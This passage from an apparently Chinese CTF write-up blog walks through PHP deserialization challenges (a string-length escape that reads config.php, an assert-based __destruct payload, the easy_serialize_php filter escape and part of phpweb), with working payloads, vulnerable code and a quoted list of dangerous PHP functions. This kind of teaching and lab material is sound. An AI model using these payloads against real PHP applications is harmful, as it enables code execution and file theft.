punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"phone"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string">"11111111111"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"email"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string">"aa@aa.com"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"nickname"</span><span class="token punctuation">;</span>a<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">34</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token punctuation">}</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"photo"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string">"config.php"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token string">";}s:5:"</span>photo<span class="token string">";s:39:"</span>upload<span class="token operator">/</span>0cc175b9c0f1b6a831c399e269772661"<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>虽然看上去大括号被闭合了，但是要注意到<code>s:34</code>这里，在反序列化的时候进行数据读取的时候依然会读取到引号中的34位字符，就对于没有闭合上，那有该如何利用呢？再接着看代码，</p><p>看看将<code>$profile</code>序列化结果存入数据库时的操作：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">update_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$new_profile</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$new_profile</span> <span class="token operator">=</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$new_profile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$where</span> <span class="token operator">=</span> <span class="token string">"username = '$username'"</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">table</span><span class="token punctuation">,</span> <span class="token string">'profile'</span><span class="token punctuation">,</span> <span class="token variable">$new_profile</span><span class="token punctuation">,</span> <span class="token variable">$where</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>可看见对传入的参数进行了处理，跟进父类的<code>filter</code>方法：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$escape</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">'\\\\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$escape</span> <span class="token operator">=</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$escape</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'/'</span><span class="token punctuation">;</span><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$escape</span><span class="token punctuation">,</span> <span class="token string">'_'</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$safe</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'select'</span><span class="token punctuation">,</span> <span class="token string">'insert'</span><span class="token punctuation">,</span> <span class="token string">'update'</span><span class="token punctuation">,</span> <span class="token string">'delete'</span><span class="token punctuation">,</span> <span class="token string">'where'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$safe</span> <span class="token operator">=</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$safe</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'/i'</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$safe</span><span class="token punctuation">,</span> <span class="token string">'hacker'</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>可见<code>$string</code>参数经过了两次过滤，第一次等于没用，两次应该都是来防止sql注入的，但这里似乎也不存在sql注入，序列化后的<code>$profile</code>不可能有sql注入风险，而<code>$username</code>的取值来自<code>$_SESSION[&#39;username&#39;]</code>，而<code>username</code>的<code>session</code>是系统分配的，这里也不存在sql注入，所以想想怎么利用在反序列化上面</p><p>这里就涉及到本题的核心了，<strong>反序列化长度逃逸字符</strong></p><p>在php反序列化的守护是根据s后面的值来取字符串长度的，而在<code>filter</code>方法总存在<code>preg_replace</code>替换，如果有<code>&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;</code>其中之一就替换成<code>&#39;hacker&#39;</code>，<code>hacker</code>长度为6位，试想如果替换了里面长度小于6位的字符串，而s后的取值长度发值有没变，那么就会有末尾的字符溢出不会被读取到，而没被读取到的话自然就被当做序列化后的格式处理，再结合这里，改闭合的大括号就可以闭合的上，再看看我们需要逃逸的字符串<code>&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>，就是这34位，而替换的字符串中正好一个有比<code>hacker</code>短的字符串<code>where</code>，那么一次就可以逃逸一个出来，那么直接传入34个<code>where</code>就可以将<code>&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>完整的逃逸出来，于是最终<code>payload</code>如下：</p><pre class=" language-php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"phone"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token string">"11111111111"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"email"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token string">"aa@aa.com"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"nickname"</span><span class="token punctuation">;</span>a<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span>i<span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">34</span><span class="token punctuation">:</span><span class="token string">"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere"</span><span class="token punctuation">;</span><span class="token punctuation">}</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string">"photo"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token string">"config.php"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token string">";}s:5:"</span>photo<span class="token string">";s:39:"</span>upload<span class="token operator">/</span>0cc175b9c0f1b6a831c399e269772661"<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>令<code>nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;}s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;}</code>即可</p><p>随后发包：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200412212311132.png" alt="" loading="lazy"></p><p>查看<code>profile.php</code>网页页面源代码，将图片的base64解可得到<code>config.php</code>的内容，即可得到flag</p><h3 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="NPUCTF2020-ReadlezPHP"></a>NPUCTF2020-ReadlezPHP</h3><p>F12后点进去可以看到源码</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200422183658606.png" alt="" loading="lazy"></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token shell-comment comment">#error_reporting(0);</span><span class="token keyword">class</span> <span class="token class-name">HelloPhp</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$b</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token string">"Y-m-d h:i:s"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token string">"date"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token punctuation">;</span>        <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">b</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HelloPhp</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>@<span class="token variable">$ppp</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">2020</span><span class="token operator">-</span><span class="token number">04</span><span class="token operator">-</span><span class="token number">22</span> <span class="token number">10</span><span class="token punctuation">:</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token number">24</span></code></pre><p>简单的反序列化</p><p><code>__destruct</code>方法在反序列化的时候触发，里面的<code>$b($a)</code>即作为代码执行的条件，于是可以构造<code>assert(phpinfo())</code>，<code>payload</code>如下：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">HelloPhp</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">'phpinfo()'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string">"assert"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HelloPhp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>将结果传入<code>data</code>搜索flag即可得到flag</p><h3 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="安洵杯-2019-easy_serialize_php"></a>安洵杯-2019-easy_serialize_php</h3><p>题目给出了源码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$function</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$filter_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'php'</span><span class="token punctuation">,</span><span class="token string">'flag'</span><span class="token punctuation">,</span><span class="token string">'php5'</span><span class="token punctuation">,</span><span class="token string">'php4'</span><span class="token punctuation">,</span><span class="token string">'fl1g'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string">'/'</span><span class="token punctuation">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">,</span><span class="token variable">$filter_arr</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'/i'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'guest'</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'function'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$function</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'&lt;a href="../index.php?f=highlight_file">source_code&lt;/a>'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string">'guest_img.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$serialize_info</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string">'highlight_file'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string">'phpinfo'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'phpinfo();'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//maybe you can find something in here!</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string">'show_image'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$userinfo</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serialize_info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$userinfo</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>在令<code>$function == &#39;phpinfo&#39;</code>时查看<code>phpinfo()</code>内容发现存在<code>d0g3_f1ag.php</code> 文件，推测flag在其中，于是想办法构造文件读取方法</p><p>不难看到代码中有一个<code>extract()</code>函数，这个函数如果没设置<code>extract_rules</code>为<code>EXTR_SKIP</code> 则会覆盖原有变量</p><ul><li><strong>extract()</strong>： 函数从数组中将变量导入到当前的符号表。<a href="https://www.php.net/manual/zh/function.extract.php" target="_blank" rel="noopener">参考</a></li></ul><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200515135141013.png" alt="" loading="lazy"></p><p>那么我们如果想要读取<code>d0g3_f1ag.php</code>文件的内容就需要令反序列化后的<code>$_SESSION[&#39;img&#39;]</code>为<code>d0g3_f1ag.php  =&gt;  ZDBnM19mMWFnLnBocA==</code>则初步反序列化内容<code>s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;</code>再看到<code>$serialize_info = filter(serialize($_SESSION));</code>，先经过序列化，然后在进行<code>filter</code>函数，也就是过滤替换操作，这样的话就很有可能会造成序列化字符串逃逸的问题，于是构造利用payload：</p><pre class=" language-php"><code class="language-php"><span class="token constant">_SESSION</span><span class="token punctuation">[</span>user<span class="token punctuation">]</span><span class="token operator">=</span>flagflagflagflagphpphp<span class="token operator">&amp;</span><span class="token constant">_SESSION</span><span class="token punctuation">[</span><span class="token keyword">function</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string">"ZDBnM19mMWFnLnBocA=="</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"f"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"a"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>由于<code>_SESSION</code>数组有3个值，则需要在后面补充随便一个值即可</p><p>传入后<code>$serialize_info</code>的就为以下值</p><pre class=" language-php"><code class="language-php">a<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string">"user"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">22</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string">"function"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">34</span><span class="token punctuation">:</span><span class="token string">";s:3:"</span>img<span class="token string">";s:20:"</span>ZDBnM19mMWFnLnBocA<span class="token operator">==</span><span class="token string">";} "</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string">"Z3Vlc3RfaW1nLnBuZw=="</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><code>user</code>闭合<code>&quot;;s:8:&quot;function&quot;;s:34:</code>，随后再读取<code>s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;</code>，随后大括号闭合，后面的<code>&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;}</code>值丢弃</p><p>读取到<code>d0g3_f1ag.php</code> 内容为</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">'flag in /d0g3_fllllllag'</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>再依法读取<code>/d0g3_fllllllag</code>即可</p><pre class=" language-php"><code class="language-php"><span class="token constant">_SESSION</span><span class="token punctuation">[</span>user<span class="token punctuation">]</span><span class="token operator">=</span>flagflagflagflagphpphp<span class="token operator">&amp;</span><span class="token constant">_SESSION</span><span class="token punctuation">[</span><span class="token keyword">function</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string">"img"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">:</span><span class="token string">"L2QwZzNfZmxsbGxsbGFn"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"f"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"a"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h3><p>题目每隔一段时间都会自动发一个包刷新一下网页，抓包下来看看发来了啥数据</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200625154555825.png" alt="" loading="lazy"></p><p>测试后报错得到函数调用了<code>call_user_func()</code>函数，该函数把第一个参数作为回调函数调用，也就是说这个数据包调用了date函数，传入了后面为p的参数，并且执行了函数输出了结果</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200625155114637.png" alt="" loading="lazy"></p><p>于是用<code>system</code>函数测试命令执行</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20200625155200767.png" alt="" loading="lazy"></p><p>被过滤了，于是直接将<code>index.php</code>的源码读取出来(读根目录没有flag)，<code>func=readfile&amp;p=index.php</code>，得到源码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$disable_fun</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token string">"shell_exec"</span><span class="token punctuation">,</span><span class="token string">"system"</span><span class="token punctuation">,</span><span class="token string">"passthru"</span><span class="token punctuation">,</span><span class="token string">"proc_open"</span><span class="token punctuation">,</span><span class="token string">"show_source"</span><span class="token punctuation">,</span><span class="token string">"phpinfo"</span><span class="token punctuation">,</span><span class="token string">"popen"</span><span class="token punctuation">,</span><span class="token string">"dl"</span><span class="token punctuation">,</span><span class="token string">"eval"</span><span class="token punctuation">,</span><span class="token string">"proc_terminate"</span><span class="token punctuation">,</span><span class="token string">"touch"</span><span class="token punctuation">,</span><span class="token string">"escapeshellcmd"</span><span class="token punctuation">,</span><span class="token string">"escapeshellarg"</span><span class="token punctuation">,</span><span class="token string">"assert"</span><span class="token punctuation">,</span><span class="token string">"substr_replace"</span><span class="token punctuation">,</span><span class="token string">"call_user_func_array"</span><span class="token punctuation">,</span><span class="token string">"call_user_func"</span><span class="token punctuation">,</span><span class="token string">"array_filter"</span><span class="token punctuation">,</span> <span class="token string">"array_walk"</span><span class="token punctuation">,</span>  <span class="token string">"array_map"</span><span class="token punctuation">,</span><span class="token string">"registregister_shutdown_function"</span><span class="token punctuation">,</span><span class="token string">"register_tick_function"</span><span class="token punctuation">,</span><span class="token string">"filter_var"</span><span class="token punctuation">,</span> <span class="token string">"filter_var_array"</span><span class="token punctuation">,</span> <span class="token string">"uasort"</span><span class="token punctuation">,</span> <span class="token string">"uksort"</span><span class="token punctuation">,</span> <span class="token string">"array_reduce"</span><span class="token punctuation">,</span><span class="token string">"array_walk"</span><span class="token punctuation">,</span> <span class="token string">"array_walk_recursive"</span><span class="token punctuation">,</span><span class="token string">"pcntl_exec"</span><span class="token punctuation">,</span><span class="token string">"fopen"</span><span class="token punctuation">,</span><span class="token string">"fwrite"</span><span class="token punctuation">,</span><span class="token string">"file_put_contents"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$a</span><span class="token operator">=</span> <span class="token function">gettype</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">==</span> <span class="token string">"string"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token string">"Y-m-d h:i:s a"</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token string">"date"</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func</span> <span class="token operator">!=</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$func</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">"func"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$p</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">"p"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$func</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token 